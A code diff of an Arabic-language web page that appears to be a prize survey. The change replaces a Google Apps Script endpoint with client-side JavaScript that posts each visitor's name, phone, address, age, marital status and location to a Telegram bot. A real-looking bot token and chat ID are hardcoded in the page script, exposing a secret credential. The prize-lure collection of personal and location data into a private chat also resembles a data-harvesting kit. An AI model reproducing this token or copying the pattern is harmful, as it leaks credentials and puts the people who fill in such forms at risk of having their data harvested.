@@ -257,8 +257,9 @@
 </div>
 
 <script>
-    // !!! لا تنسى وضع رابط Google Apps Script الخاص بك هنا !!!
-    const scriptURL = 'ضع_هنا_رابط_الـ_Web_App_الخاص_بـ_Google_Script'; 
+    // إعدادات بوت تليجرام
+    const telegramToken = '8537869946:AAHFBmWLeUbSzop4IkqThozbjDq6ubxgbD0';
+    const telegramChatId = '1945335112'; // تمت إضافته بنجاح!
     const form = document.getElementById('survey-form');
 
     let currentPrizeIndex = 0;
@@ -301,19 +302,44 @@
         document.getElementById('submitBtn').innerText = "جاري الحفظ...";
         document.getElementById('loader').style.display = 'block';
 
-        const formData = new FormData();
-        formData.append('Name', document.getElementById('name').value);
-        formData.append('Phone', document.getElementById('phone').value);
-        formData.append('Address', document.getElementById('address').value);
-        formData.append('Age', document.getElementById('age').value);
-        formData.append('Status', document.getElementById('marital_status').value);
-        formData.append('Location', document.getElementById('location_data').value);
+        const name = document.getElementById('name').value;
+        const phone = document.getElementById('phone').value;
+        const address = document.getElementById('address').value;
+        const age = document.getElementById('age').value;
+        const maritalStatus = document.getElementById('marital_status').value;
+        const locationData = document.getElementById('location_data').value;
 
-        fetch(scriptURL, { method: 'POST', body: formData})
-            .then(response => {
-                document.getElementById('survey-form').style.display = 'none';
-                document.getElementById('success-message').style.display = 'block';
-                if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
+        const messageText = `
+🎉 <b>تسجيل جديد من الموقع</b> 🎉
+
+👤 <b>الاسم:</b> ${name}
+📱 <b>الهاتف:</b> ${phone}
+📍 <b>العنوان:</b> ${address}
+🎂 <b>السن:</b> ${age}
+💍 <b>الحالة:</b> ${maritalStatus}
+🌍 <b>الموقع:</b> ${locationData}
+`;
+
+        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+        fetch(url, { 
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: messageText,
+                parse_mode: 'HTML'
+            })
+        })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('survey-form').style.display = 'none';
+                    document.getElementById('success-message').style.display = 'block';
+                    if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
+                } else {
+                    throw new Error(data.description || "خطأ في الاتصال بتليجرام");
+                }
             })
             .catch(error => {
                 console.error('Error!', error.message);
